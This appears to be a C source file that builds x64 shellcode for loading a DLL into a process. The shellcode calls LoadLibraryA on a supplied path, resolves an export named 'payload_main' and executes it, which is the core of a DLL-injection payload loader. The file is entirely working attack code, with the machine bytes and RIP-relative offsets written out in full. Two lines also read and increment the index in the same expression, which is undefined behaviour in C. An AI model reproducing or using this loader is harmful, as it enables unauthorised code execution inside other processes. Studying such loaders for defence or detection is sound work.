#include "shellcode.h"
#include <stdlib.h>
#include <string.h>

//
// x64 shellcode layout:
//
// Code (0x00 - 0x34):
//   sub  rsp, 28h
//   lea  rcx, [rip + dll_path]        -> LoadLibraryA(path)
//   call [rip + pLoadLibraryA]
//   test rax, rax
//   jz   done
//   mov  rcx, rax
//   lea  rdx, [rip + func_name]       -> GetProcAddress(hMod, "payload_main")
//   call [rip + pGetProcAddress]
//   test rax, rax
//   jz   done
//   xor  rcx, rcx
//   call rax                           -> payload_main(0)
// done:
//   add  rsp, 28h
//   ret
//
// Data (0x38+):
//   [8 bytes] pLoadLibraryA
//   [8 bytes] pGetProcAddress
//   [13 bytes] "payload_main\0"
//   [N bytes] dll_path\0
//

#define CODE_SIZE   0x38    // 0x35 rounded up to 8-byte alignment
#define DATA_OFFSET CODE_SIZE

PBYTE build_loader_shellcode(const char* dll_path, DWORD* out_size) {
    DWORD path_len = (DWORD)strlen(dll_path) + 1;
    const char func_name[] = "payload_main";
    DWORD func_name_len = sizeof(func_name); // includes null

    // Data layout after code
    DWORD off_loadlib  = DATA_OFFSET;          // +0x38
    DWORD off_getproc  = DATA_OFFSET + 8;      // +0x40
    DWORD off_funcname = DATA_OFFSET + 16;     // +0x48
    DWORD off_dllpath  = off_funcname + func_name_len; // +0x55

    DWORD total = off_dllpath + path_len;
    // Align to 8
    total = (total + 7) & ~7u;

    PBYTE sc = (PBYTE)calloc(1, total);
    if (!sc) return NULL;

    // Resolve kernel32 addresses (same across all processes per boot)
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    ULONG_PTR addr_loadlib  = (ULONG_PTR)GetProcAddress(k32, "LoadLibraryA");
    ULONG_PTR addr_getproc  = (ULONG_PTR)GetProcAddress(k32, "GetProcAddress");

    // Write data section
    *(ULONG_PTR*)(sc + off_loadlib)  = addr_loadlib;
    *(ULONG_PTR*)(sc + off_getproc)  = addr_getproc;
    memcpy(sc + off_funcname, func_name, func_name_len);
    memcpy(sc + off_dllpath, dll_path, path_len);

    // Build code with RIP-relative offsets
    // Each RIP-relative offset is computed from the byte AFTER the instruction
    DWORD i = 0;

    // sub rsp, 28h
    sc[i++] = 0x48; sc[i++] = 0x83; sc[i++] = 0xEC; sc[i++] = 0x28;

    // lea rcx, [rip + dll_path]  (7 bytes: 48 8D 0D <rel32>)
    sc[i++] = 0x48; sc[i++] = 0x8D; sc[i++] = 0x0D;
    *(DWORD*)(sc + i) = off_dllpath - (i + 4);  // RIP points past this instruction
    i += 4;
    // i = 0x0B

    // call [rip + pLoadLibraryA]  (6 bytes: FF 15 <rel32>)
    sc[i++] = 0xFF; sc[i++] = 0x15;
    *(DWORD*)(sc + i) = off_loadlib - (i + 4);
    i += 4;
    // i = 0x11

    // test rax, rax
    sc[i++] = 0x48; sc[i++] = 0x85; sc[i++] = 0xC0;
    // i = 0x14

    // jz done (done is at 0x30)
    sc[i++] = 0x74;
    sc[i++] = 0x30 - (BYTE)(i + 1);  // relative offset from next instruction
    // i = 0x16

    // mov rcx, rax
    sc[i++] = 0x48; sc[i++] = 0x89; sc[i++] = 0xC1;
    // i = 0x19

    // lea rdx, [rip + func_name]
    sc[i++] = 0x48; sc[i++] = 0x8D; sc[i++] = 0x15;
    *(DWORD*)(sc + i) = off_funcname - (i + 4);
    i += 4;
    // i = 0x20

    // call [rip + pGetProcAddress]
    sc[i++] = 0xFF; sc[i++] = 0x15;
    *(DWORD*)(sc + i) = off_getproc - (i + 4);
    i += 4;
    // i = 0x26

    // test rax, rax
    sc[i++] = 0x48; sc[i++] = 0x85; sc[i++] = 0xC0;
    // i = 0x29

    // jz done (done is at 0x30)
    sc[i++] = 0x74;
    sc[i++] = 0x30 - (BYTE)(i + 1);
    // i = 0x2B

    // xor rcx, rcx
    sc[i++] = 0x48; sc[i++] = 0x31; sc[i++] = 0xC9;
    // i = 0x2E

    // call rax
    sc[i++] = 0xFF; sc[i++] = 0xD0;
    // i = 0x30

    // done:
    // add rsp, 28h
    sc[i++] = 0x48; sc[i++] = 0x83; sc[i++] = 0xC4; sc[i++] = 0x28;
    // i = 0x34

    // ret
    sc[i++] = 0xC3;
    // i = 0x35

    *out_size = total;
    return sc;
}
